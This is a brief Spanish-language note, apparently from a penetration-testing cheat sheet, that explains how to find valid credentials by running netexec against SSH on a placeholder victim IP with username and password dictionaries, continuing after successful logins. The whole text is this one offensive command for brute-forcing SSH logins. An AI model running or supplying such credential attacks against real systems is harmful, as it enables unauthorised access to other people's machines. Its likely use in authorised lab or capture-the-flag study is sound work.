- Si tenemos 2 diccionarios con usuarios y contraseñas y queremos saber de forma mas eficiente cuales son las credenciales correctas usamos el siguiente comando:
```
netexec ssh (IP_VICTIMA) -u (DICCIONARIO_USUARIO) -p (DICCIONARIO_PASSWORD) --continue-on-success
```
